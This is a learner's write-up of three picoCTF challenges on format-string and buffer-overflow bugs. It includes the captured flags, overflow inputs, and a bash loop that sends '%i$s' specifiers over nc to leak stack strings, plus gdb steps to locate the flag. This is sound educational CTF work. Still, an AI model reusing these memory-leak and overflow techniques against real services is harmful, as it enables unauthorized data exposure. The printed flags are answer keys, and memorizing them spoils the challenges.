
# format string 0

**flag:** `picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_ef312157}`

**Thought Process**

* Since the first hint encouraged us to know about **format specifiers**, I knew the vulnerability would be something related to that.
* The second hint told us to try out different options. This, of course, referred to the code giving us options to input and it implied that inputting certain options would give us the flag.

Now, when you initially start the instance from the website, you're shown this:

```bash
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation:
```

At the first glance, instinctively I picked `Gr%114d_Cheese` has it had a format specifier (denoted by `%`, `%114d` just represents the number of characters it can hold) in it.  Upon that input, we're hit with:

```bash
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
```

As we can tell, there was a little bit of a glitch with the spacing, which further exposes the format specifier vulnerability. Now, obviously, we're gonna choose the option that has more number of `%`s, which is `Cla%sic_Che%s%steak`.  This then gives us the flag.

**Alternative Method**

After going thru the code provided to us, I noticed that there would be a certain threshold of the amount of characters I can give as input before the program malfunctions. So I tried inputting random number of characters and after I gave it 55 characters (to be exact), it directly spat out the flag.

```bash
shady@WIN-3CTPHJ9NI00:~$ nc mimas.picoctf.net 57883
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: noewnfnufnisbfaeisbfisabfaesbfsbfnefunfeneafaioufbeubfea
There is no such burger yet!

picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_ef312157}
```

**Two things I noticed here are**: 
* The long string to be inputted does not require `%`s in it at all. A collection of random alphanumeric characters worked.
* The string had to be exactly 55 characters or more. Although I cannot explain why the number is 55 and not 64 or 32, I found it out thru trial and error. 

**Mistakes Made**

* Spent too much time trying to understand and modify the code to make it give me the flag. Pretty dumb move in hindsight. 

# buffer overflow 0

**Flag:** `picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}`

**Thought Process**

* Since this is another question using the concept of **buffer overflow**, I juts went thru the code once and noticed that to overflow `buf2`, I'd need to exceed it's capacity of **16 bytes**.
* I started with 16 and eventually, at 20 characters, It outputted the flag.

Here's the input and output for 19 and 20 characters respectively:

```bash
nc saturn.picoctf.net 50321
Input: uebfdiuewbfisdsssds
The program will exit now
^C

nc saturn.picoctf.net 50321
Input: uebfdiuewbfisdsssdsh
picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
```


# flag leak

**Flag: `picoCTF{L34k1ng_Fl4g_0ff_St4ck_999e2824}`**

**Thought Process**

* We're given a file `vuln` , when executed using Linux asks us to tell it a story, and our hint is **Format Strings**, so I did some reading on format string vulnerabilities.
* Then I tried a bunch of format specifiers to see how it would react to them: 

![Pasted image 20241206135613](https://github.com/user-attachments/assets/5287c1f7-ab1a-4d10-9e79-d81a68e76e09)


* Now, as I understood from the quoted article 

![image](https://github.com/user-attachments/assets/a604aad2-d53b-4475-9dbe-775cc88a4535)

In our case, we now know that we need to somehow find the address of our flag, and our format is `%i$s` where `i` is the flag's memory location, and the `s` at the end is to access the string corresponding to that memory location.


* Now, trying to find the address of the flag string can be done using `gdb`, but instead I wrote a small bash script that ran all values from 0-50, and looked inside the contents:
  
```bash
for i in {0..50}; do echo "%$i\$s" | nc saturn.picoctf.net 60614; done
```

and this printed out a bunch of random characters UNTILL

![Pasted image 20241206150106](https://github.com/user-attachments/assets/989b1c6b-8af3-4e6a-9ab6-a64642a4b69e)

oh and for efficiency, we can make the script to grep the flag for a cleaner output, our new command would be:

```bash
for i in {0..50}; do echo "%$i\$s" | nc saturn.picoctf.net 60614 | grep CTF; done
```

![Pasted image 20241206153037](https://github.com/user-attachments/assets/0729db35-8f56-429b-bcfa-459da25bfe9c)


**Alternative Approach**

* Initially, I tried to find out the memory address of the flag using gdb, to do this, I used the command `gdb` in bash followed by `disass vuln` to come across:

![image](https://github.com/user-attachments/assets/c0741e52-6d3d-4635-b7e4-d54d0cd7ec08)

Here, we see that `readflag` is at the memory address `0x08049355`, So I added a breakpoint right after it at `0x0804935a`, and then ran the program, the commands I used were

```bash
b *0x0804935a
```
 and then 

```bash
run
```

which then prompted this 

![image](https://github.com/user-attachments/assets/d0158948-8fa7-4f16-a099-3275c858db1f)

where we can see that the flag is present in the 24th stack. This way, if we just input `%24$s` to the instance, it will output our flag.

![image](https://github.com/user-attachments/assets/8cea7d63-36c3-41a0-b9ed-c029ae983da7)




**New Things Learnt**

* A better grasp of how to deal with format string vulerabilities.
* Write scripts in bash.
* Locating the memory address of an entity using gbd.



**References**
* https://www.infosecinstitute.com/resources/secure-coding/how-to-exploit-format-string-vulnerabilities/


